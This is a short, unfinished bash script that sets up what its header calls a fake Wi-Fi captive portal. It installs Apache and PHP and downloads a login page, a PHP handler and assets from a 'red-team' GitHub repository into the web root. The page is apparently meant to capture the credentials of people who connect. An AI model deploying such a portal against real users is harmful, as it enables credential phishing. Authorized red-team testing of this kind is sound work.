#!/bin/bash

# WIP: Fake wifi captive portal.

# Colors:
W="\033[0;37m"
R="\033[0;31m"
G="\033[0;32m"
Y="\033[1;33m"
B="\033[1;34m"
BP="\033[1;35m"
NC="\033[0m"

# Check if root.
root_check() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${R}[-] ${W}Please run as root."
        exit 1
    fi
}

# Install dependencies.
install_dep() {
    echo -e "${Y}[*] Updating repository and installing dependencies..."
    apt update -y
    apt install wget apache2 php libapache2-mod-php php-curl -y
    echo -e "${G}[+] Done."
}

# Captive portal.
setup_portal() {
    cd; mkdir Portal; cd Portal;
    echo -e "${Y}[*] Setting up portal directory at /var/www/html..."
    wget https://raw.githubusercontent.com/nathanielangeles/red-team/refs/heads/main/wifi/portal/index.html
    wget https://raw.githubusercontent.com/nathanielangeles/red-team/refs/heads/main/wifi/portal/styles.css
    wget https://raw.githubusercontent.com/nathanielangeles/red-team/refs/heads/main/wifi/portal/login.php
    wget https://github.com/nathanielangeles/red-team/blob/main/wifi/portal/background.jpg
    
    mv * /var/www/html
    echo -e "${G}[+] Done."
}

# Main function.
root_check
install_dep
setup_portal